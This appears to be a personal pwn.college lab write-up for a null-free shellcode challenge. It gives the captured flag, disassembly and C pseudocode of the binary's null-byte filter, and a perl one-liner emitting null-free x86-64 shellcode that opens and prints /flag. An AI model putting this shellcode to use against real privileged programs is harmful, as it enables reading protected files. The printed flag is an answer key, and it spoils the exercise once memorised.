---
Platform: Pwn College
Tittle: NULL-Free Shellcode
Date & Tme: 2026 - 09 - 07 10:37
tags:
  - Challenge
  - ShellcodeInjection
  - BinaryExploitation
---
---
## FLAG : `pwn.college{0qLPDigvVgeflv65Blv--pE1_8M.dlTMywiN4kDOyEzW}`

---
## Solution :
This challenge is still the same as [[Basic Shellcode]], but the shellcode couln't contain `\x00` (null bytes). It has the mechanism to check it : 
```asm
   0x00000000000017ad <+582>:	mov    DWORD PTR [rbp-0x14],0x0
   0x00000000000017b4 <+589>:	jmp    0x17f0 <main+649>
   0x00000000000017b6 <+591>:	mov    rdx,QWORD PTR [rip+0x287b]        # 0x4038 <shellcode>
   0x00000000000017bd <+598>:	mov    eax,DWORD PTR [rbp-0x14]
   0x00000000000017c0 <+601>:	cdqe
   0x00000000000017c2 <+603>:	add    rax,rdx
   0x00000000000017c5 <+606>:	movzx  eax,BYTE PTR [rax]
   0x00000000000017c8 <+609>:	test   al,al
   0x00000000000017ca <+611>:	jne    0x17ec <main+645>
   0x00000000000017cc <+613>:	mov    eax,DWORD PTR [rbp-0x14]
   0x00000000000017cf <+616>:	mov    esi,eax
   0x00000000000017d1 <+618>:	lea    rdi,[rip+0xd01]        # 0x24d9
   0x00000000000017d8 <+625>:	mov    eax,0x0
   0x00000000000017dd <+630>:	call   0x1180 <printf@plt>
   0x00000000000017e2 <+635>:	mov    edi,0x1
   0x00000000000017e7 <+640>:	call   0x1200 <exit@plt>
   0x00000000000017ec <+645>:	add    DWORD PTR [rbp-0x14],0x1
   0x00000000000017f0 <+649>:	mov    eax,DWORD PTR [rbp-0x14]
   0x00000000000017f3 <+652>:	movsxd rdx,eax
   0x00000000000017f6 <+655>:	mov    rax,QWORD PTR [rip+0x2833]        # 0x4030 <shellcode_size>
   0x00000000000017fd <+662>:	cmp    rdx,rax
   0x0000000000001800 <+665>:	jb     0x17b6 <main+591>
```

Or in C : 
```shell
shellcode_size = read(fd, shellcode, ...);
assert(shellcode_size != 0);

puts(...);
puts(...);

for (int i = 0; i < shellcode_size; i++) {
    if (shellcode[i] == '\x00') {
        printf("Pesan error index: %d\n", i);
        exit(1);
    }
}
```

Here is the payload 
```bash
perl -e 'print "\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67"'
```

---
### Key Takeaways : 
- The last byte won't need \x00

